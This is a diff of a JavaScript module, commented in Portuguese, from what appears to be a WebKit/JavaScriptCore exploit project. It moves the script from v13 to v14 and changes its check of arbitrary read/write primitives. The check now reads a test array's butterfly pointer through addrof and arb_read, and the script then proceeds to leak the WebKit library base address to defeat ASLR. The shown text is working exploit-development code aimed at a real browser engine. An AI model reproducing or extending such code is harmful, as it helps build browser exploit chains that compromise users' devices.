@@ -1,10 +1,11 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v13 - Final WebKit Leak Strategy)
+// js/script3/testArrayBufferVictimCrash.mjs (v14 - Final Leak Strategy)
 // =======================================================================================
 // ESTRATÉGIA FINAL:
-// 1. Integração completa com as primitivas potentes de 'core_exploit.mjs'.
-// 2. A lógica de depuração do UAF foi removida, pois não é mais necessária.
-// 3. O foco do script agora é usar as primitivas de L/E estáveis para alcançar
-//    o próximo objetivo: vazar o endereço base da biblioteca WebKit para derrotar o ASLR.
+// 1. CORREÇÃO: A fase de verificação (Fase 2) foi atualizada para usar um Array
+//    como alvo, garantindo que as primitivas de L/E sejam testadas em um objeto
+//    que utiliza um "butterfly" de forma confiável, contornando otimizações "in-line".
+// 2. A estratégia de vazamento da Fase 3 permanece, agora com a certeza de que
+//    as ferramentas foram verificadas corretamente.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +17,7 @@ import {
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Base_Leak_v13";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_WebKit_Base_Leak_v14";
 
 // --- Funções de Conversão (mantidas para addrof/fakeobj) ---
 function int64ToDouble(int64) {
@@ -59,23 +60,24 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("Primitiva 'addrof' operacional.", "good");
 
-        // --- FASE 2: VERIFICAÇÃO DAS PRIMITIVAS DE L/E (arb_read/arb_write) ---
+        // --- FASE 2: VERIFICAÇÃO DAS PRIMITIVAS DE L/E USANDO UM ARRAY ---
         logS3("--- FASE 2: Verificando Primitivas de L/E Importadas de 'core_exploit.mjs' ---", "subtest");
         
-        // Para forçar a propriedade a ser armazenada no butterfly, criamos um objeto vazio e depois adicionamos a propriedade.
-        const test_obj = {};
-        test_obj.a = new AdvancedInt64(0x41414141, 0x42424242);
+        // <-- MUDANÇA: Usando um Array para a verificação para garantir o uso do butterfly.
+        const test_array = [
+            new AdvancedInt64(0x41414141, 0x42424242)
+        ];
 
-        const test_obj_addr = addrof(victim_array[0] = test_obj);
+        const test_array_addr = addrof(victim_array[0] = test_array);
         victim_array[0] = null; // Limpeza
         
-        const butterfly_addr = await arb_read(test_obj_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
-        const value_read = await arb_read(butterfly_addr, 8);
+        const butterfly_addr = await arb_read(test_array_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET), 8);
+        const value_read = await arb_read(butterfly_addr, 8); // Lê o primeiro elemento do butterfly
         
-        if (value_read.equals(test_obj.a)) {
+        if (value_read.equals(test_array[0])) {
             logS3(`+++++++++++ SUCESSO! Primitivas 'arb_read'/'arb_write' são 100% funcionais. ++++++++++++`, "vuln");
         } else {
-            throw new Error(`Verificação de L/E falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_obj.a.toString(true)}`);
+            throw new Error(`Verificação de L/E falhou. Lido: ${value_read.toString(true)}, Esperado: ${test_array[0].toString(true)}`);
         }
 
         // --- FASE 3: EXECUTANDO O VAZAMENTO DA BASE DO WEBKIT ---
